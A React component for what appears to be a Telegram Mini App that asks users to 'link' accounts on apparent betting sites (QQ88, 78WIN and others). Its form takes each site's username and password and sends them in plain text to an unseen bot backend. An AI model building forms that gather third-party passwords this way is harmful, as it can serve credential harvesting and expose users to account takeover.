import React, { useEffect, useState } from 'react';

function App() {
  const [tg, setTg] = useState(null);
  const [form, setForm] = useState({ brand: 'QQ88', tk: '', mk: '' });

  useEffect(() => {
    const telegram = window.Telegram?.WebApp;
    if (telegram) {
      telegram.ready();
      telegram.expand();
      setTg(telegram);
      document.body.style.backgroundColor = telegram.themeParams.bg_color || '#f4f4f5';
      document.body.style.color = telegram.themeParams.text_color || '#000';
    }
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!form.tk || !form.mk) {
      tg?.showAlert("⚠️ Vui lòng nhập đầy đủ thông tin!");
      return;
    }
    const data = JSON.stringify({ action: 'link_account', ...form });
    tg?.sendData(data); // Gửi data về Worker thông qua Telegram Bot API
  };

  return (
    <div style={{ padding: '20px', fontFamily: 'Arial' }}>
      <h2 style={{ textAlign: 'center' }}>🎮 LIÊN KẾT TÀI KHOẢN</h2>
      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
        <select value={form.brand} onChange={e => setForm({...form, brand: e.target.value})} style={{ padding: '10px', borderRadius: '8px' }}>
          <option value="QQ88">QQ88</option>
          <option value="78WIN">78WIN</option>
          <option value="SC88">SC88</option>
          <option value="C168">C168</option>
        </select>
        <input placeholder="Tài khoản..." value={form.tk} onChange={e => setForm({...form, tk: e.target.value})} style={{ padding: '10px', borderRadius: '8px' }} />
        <input type="password" placeholder="Mật khẩu..." value={form.mk} onChange={e => setForm({...form, mk: e.target.value})} style={{ padding: '10px', borderRadius: '8px' }} />
        <button type="submit" style={{ padding: '12px', borderRadius: '8px', background: '#2481cc', color: '#fff', border: 'none', fontWeight: 'bold' }}>
          🔗 LƯU LIÊN KẾT
        </button>
      </form>
    </div>
  );
}

export default App;
